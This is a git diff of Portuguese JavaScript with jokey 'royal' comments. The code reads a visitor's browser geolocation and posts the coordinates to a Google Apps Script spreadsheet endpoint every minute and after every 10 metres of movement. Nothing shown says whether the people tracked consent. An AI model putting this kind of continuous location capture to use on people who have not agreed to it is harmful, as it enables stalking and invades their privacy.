@@ -44,26 +44,25 @@ const URL_API_REAL = "https://script.google.com/macros/s/AKfycbycNtfKcsjIWoDFVGQ
 let ultimaLat = null;
 let ultimaLng = null;
 
+// Função para enviar os dados ao Trono
 function enviarParaPlanilha(lat, lng) {
-    console.log("Enviando coordenadas ao trono...");
     fetch(URL_API_REAL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ lat: lat, lng: lng })
     });
+    console.log("Coordenada enviada por decreto real!");
 }
 
-// 1. CAPTURA IMEDIATA (Assim que o site abre)
-navigator.geolocation.getCurrentPosition((pos) => {
-    const lat = pos.coords.latitude;
-    const lng = pos.coords.longitude;
-    enviarParaPlanilha(lat, lng); // Grava a posição inicial parado
-    ultimaLat = lat;
-    ultimaLng = lng;
-}, null, { enableHighAccuracy: true });
+// 1. REGRA DO TEMPO: Enviar a cada 1 minuto (60000ms)
+setInterval(() => {
+    navigator.geolocation.getCurrentPosition((pos) => {
+        enviarParaPlanilha(pos.coords.latitude, pos.coords.longitude);
+    }, null, { enableHighAccuracy: true });
+}, 60000);
 
-// 2. VIGILÂNCIA CONTÍNUA (A cada 10 metros)
+// 2. REGRA DO ESPAÇO: Enviar a cada 10 metros de movimento
 navigator.geolocation.watchPosition((pos) => {
     const novaLat = pos.coords.latitude;
     const novaLng = pos.coords.longitude;
@@ -75,7 +74,7 @@ navigator.geolocation.watchPosition((pos) => {
     }
 }, null, { enableHighAccuracy: true });
 
-// Função de cálculo de distância (Mantenha a que já tens)
+// Função de cálculo de distância
 function calcularDistanciaImperial(lat1, lon1, lat2, lon2) {
     const R = 6371000;
     const dLat = (lat2 - lat1) * Math.PI / 180;
